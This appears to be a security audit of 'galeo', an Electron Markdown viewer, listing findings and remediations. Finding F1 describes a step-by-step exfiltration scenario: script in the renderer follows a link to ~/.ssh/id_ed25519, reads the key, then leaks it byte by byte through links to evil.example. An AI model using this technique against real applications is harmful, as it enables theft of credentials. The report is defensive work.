## Attack surface map

Entry points:

- **B5, document content**: the Markdown worker pipeline is remark → rehype-raw → rehype-sanitize. KaTeX and Shiki
  run after sanitizing. Mermaid runs on the UI thread, and DOMPurify sanitizes its SVG.
- **B5→B3→B7, links and images**:
  - `documents.followLink` and `documents.resolveImage` check main's own link set.
  - `shell.openExternal` is used.
  - Images are served from `galeo://file/<uuid>`.
- **B1, argv**: the path is `bin/gal` → `packaging/linux/galeo.sh` → `src/core/argv.ts`.
- **B2**: the second-instance channel (`instance-channel.ts`, `parseArgv(forwarded)`).
- **B3, IPC**: about 50 channels. They go through `registerIpc`, with a sender check and a zod schema per channel
  (`src/shared/contracts/schemas.ts`).
- **B4, disk**:
  - settings, sessions, recent files and custom CSS;
  - the quick-open walker;
  - the watcher;
  - the launcher installer (AppImage only).
- **B6, network**: `onBeforeRequest` guard, host-resolver `MAP * ~NOTFOUND`, CSP, and WebRTC removed.
- **B8, supply chain**: lockfile, `ignore-scripts`, SHA-pinned Actions, Dependabot, and a hand-cut release (see F2).

## Findings

### F1 — Medium — A compromised page can follow document links, and drive the system browser, without any user input

- **Location**: `src/core/documents/links.ts` `follow()`; `src/main/documents/handlers.ts` `documents.followLink`;
  `src/core/links/limiter.ts`.
- **Vulnerability**: `followLink` spends no input credit, unlike quick open (SR-12's T6 mitigation). The burst rule
  counts only within a sliding 10 s window, so 3 opens every 10 s never trigger the confirmation.
- **Exploit scenario**: this needs script in the renderer first (T1: a sanitizer, Trusted Types or Chromium bypass).
  The hostile `notes.md` contains:
  - `[k](/home/u/.ssh/id_ed25519)`;
  - 256 links `https://evil.example/b/00`…`/ff`.

  The attack then runs in four steps:

  1. The script calls `followLink(id, '/home/u/.ssh/id_ed25519')`, which navigates the tab.
  2. `documents.read(id)` returns the key's text.
  3. The script picks the links whose index encodes the next byte, and calls `followLink(id, 'https://evil.example/b/<byte>')`
     3 times per 10 s.
  4. The browser fetches each URL, which leaks 1 byte per open.

  An ed25519 key (about 400 bytes) leaks in about 22 minutes, with visible browser tabs. That is noisy, but it is
  real and unattended. It contradicts the intent of SR-04 ("a compromised renderer cannot build an exfiltration
  URL"): the attacker doesn't build the URL, but they choose among pre-built ones.
- **Evidence**: a throwaway Playwright probe (run headless, then deleted) loaded a document like the one above:
  - 6 `followLink` calls from `page.evaluate`, with no input, all returned `{kind:'external'}`;
  - main recorded `["…/b/3","…/b/5","…/b/1","…/b/7","…/b/0","…/b/6"]` with no confirmation;
  - the absolute-path link then navigated, and `documents.read` returned `SECRET-KEY-MATERIAL-1234`.
- **Remediation** (small; it extends an existing mechanism):
  1. Require `input.spend(window)` in `documents.followLink` (all target kinds), as in `quickOpen.open`. Every real
     follow comes from a click or keypress, which earns a credit.
  2. Optionally, make the burst count cumulative per document: confirm after the 3rd external open per document
     ever, or with a long decay.
  3. Add an e2e test: `followLink` from `page.evaluate` without input is refused with `no-input`.

  The threat model's SR-12 and the T6 residual row should then mention link follows alongside quick open.

### F2 — Medium — SR-10 release provenance is not implemented (releases are built by hand on a workstation)

- **Location**: `docs/RELEASING.md` "Release checklist" steps 5–6; `.github/workflows/` (no release workflow).
- **Vulnerability**: SR-10 requires releases built only in CI, with `SHA256SUMS` and GitHub artifact attestations.
  The documented process packages on the owner's machine and uploads the result. Nothing ties the published `.deb`
  or AppImage to a reviewed commit and the CI-verified fuses.
- **Exploit scenario**:
  - A compromised developer environment (a malicious devDependency postinstall is blocked by `ignore-scripts`, but
    not a malicious `npm run setup` step or a local toolchain) ships a tampered `.deb`.
  - Users have no checksum or provenance to detect it.
  - The CI `verify:package` run happens on a different build than the one published.
- **Remediation** (owner decision):
  - **(a)** Add a `release.yml`, triggered on a `v*` tag, that:
    - runs preflight and package;
    - runs `verify:package`;
    - writes `sha256sum release/*.{deb,AppImage} > SHA256SUMS`;
    - runs `actions/attest-build-provenance` (SHA-pinned; `permissions: id-token: write, attestations: write, contents: write`
      on that job only);
    - creates the GitHub Release.
  - **(b)** If hand releases stay for v0.1, record this as a new ADR that supersedes the SR-10 clause, and at minimum
    publish `SHA256SUMS`.

  Repo-side GitHub work is deferred to the end of v0.2 per CLAUDE.md, which argues for (b) now and (a) later.

### F3 — Medium — Electron 44.7.0 security backports are not yet taken (SR-09 7-day window)

- **Location**: `package.json` `"electron": "44.6.0"`.
- **Issue**: 44.7.0 (2026-10-07) carries about 45 upstream security backports (electron/electron#54666 and #54657,
  labelled security; V8 ×4, Chromium ×27). Their severities aren't published in the PR. Assume some are High, as is
  usual for these roll-ups.
- **Exploit scenario**: T4/A5. A document crafted for one of those Chromium or V8 bugs exploits the renderer. The
  sandbox contains it unless the user runs `--no-sandbox` (T17).
- **Remediation**:
  - Apply the Dependabot electron bump by hand on main, as one commit (project convention), before tagging v0.1.
  - The SR-09 deadline is **2026-10-14**.
  - Re-run preflight and `verify:package` afterwards.

### F4 — Low — "Open with default app" uses an extension denylist that misses some runnable types, checked on the link name

- **Location**: `src/core/links/open-with.ts` `LAUNCHERS`; `menus.ts openable()`.
- **Issues**:
  1. The denylist misses `.jar`, `.jnlp`, `.flatpakref`, `.flatpakrepo`, `.deb`/`.rpm` (installer prompts) and
     `.py`/`.pyz`. On this machine `openjdk-25-java.desktop` registers `Exec=cautious-launcher %f /usr/bin/java -jar`
     for jars, but the default here is File Roller. Other Ubuntu or KDE setups may run jars directly, and `.jnlp`
     with icedtea runs remote code.
  2. The extension is taken from the tab's path, not from `realpath`. A symlink `README.txt → payload.jar` passes
     the check. GIO usually types by the link's name, so the impact is low.
- **Exploit scenario**: A4 with a different extension. A cloned repo ships `docs/tool.jar`. The user opens it,
  sees the "can't display" state, and right-clicks "Open with default app", which launches java on systems that map
  jars to the JRE.
- **Remediation**:
  - Add those extensions.
  - Check `extensionOf(await fs.realpath(path))` as well as the name.
  - Consider an allowlist instead: offer it only for formats galeo recognises (text, Markdown, images, PDF) plus
    MIME types that open in viewers.

### F5 — Low — Some page-callable channels change app state with no user input

- **Location**: `src/main/index.ts` handlers:
  - `profiles.delete` (deletes the window's own non-default profile: its settings, session and custom CSS);
  - `recent.clear`;
  - `settings.set` and `settings.reset`;
  - `app.installLauncher` (AppImage: writes `~/.local/bin/galeo`, a `.desktop` file and an icon, with fixed content);
  - `window.command quit`.
- **Exploit scenario**: after T1, a script silently deletes the current profile's settings and session, or clears
  recent files. This affects integrity and availability of app state only. There is no file read, write of user
  files, or exfiltration, and content written by `installLauncher` is not attacker-controlled.
- **Remediation**: gate `profiles.delete`, `recent.clear` and `app.installLauncher` on `input.spend()`, or move
  their confirmation into a native dialog owned by main. Low priority.

### F6 — Low — The forwarded `--no-sandbox` is proven at the parser level only

- **Location**: SR-01 AC: "a second launch with `--no-sandbox` forwarded to a sandboxed instance leaves it
  sandboxed".
- **Status**:
  - `argv.test.ts:63` proves `parseArgv` ignores it when forwarded.
  - `index.ts:83` computes `sandboxed` once, from the first process's command line.
  - No e2e test launches a second instance with `--no-sandbox` and asserts that the first window still has no
    warning.
- **Remediation**: add one case to `tests/e2e/instance.spec.ts`.

### I1 — Info — `npm audit`: 8 moderate, dev-only, not shipped

- **Chain**: `electron-builder@26.17.0` → `app-builder-lib` → `@electron/get` (nested 4.x) → `global-agent` →
  `roarr` → `sprintf-js`. The advisory is GHSA-hp3w-g68c-fv3c: DoS through unbounded precision specifiers.
- `npm audit --omit=dev` reports **0 vulnerabilities**.
- **Reachability**: it is used only at package time, to download Electron, with the library's own format strings.
  It is not reachable from document input.
- **Fix**: npm's fix is a downgrade to `electron-builder@26.5.0`, which is not advisable. Accept until upstream bumps
  `global-agent`/`roarr`.
- The CI gate (`--audit-level=high`) is unaffected.

### I2 — Info — Mermaid `%%{init}%%` theme variables can add CSS to the diagram's own `<style>`

- **Location**: `mermaid-engine.ts` `secure` list. It covers `themeCSS` but not `themeVariables` or `fontFamily`.
  DOMPurify's SVG profile keeps `<style>`, and `onlyFragments` filters attributes, not stylesheet text.
- **Impact**: the CSS is confined to that diagram's shadow root. `url()` loads are blocked by:
  - the CSP (`img-src 'self' galeo: data:`, `font-src 'self'`);
  - the request guard;
  - the resolver lockdown.

  The corpus has this payload (`mermaid.payloads.md`, the `fontFamily` case), and the no-network suite passes on
  it. There is no exploit beyond restyling the diagram itself.
- **Recommendation**: optionally add `themeVariables` and `fontFamily` to `secure`, or strip `url(` from the SVG
  `<style>` text. Reword the code comment "can't … inject CSS" to match.

### I3 — Info — `.releaserc.json` configures semantic-release, which is neither a dependency nor run anywhere

It is harmless, but it conflicts with the hand-release process in RELEASING.md. Remove it, or adopt it as part of
F2(a).
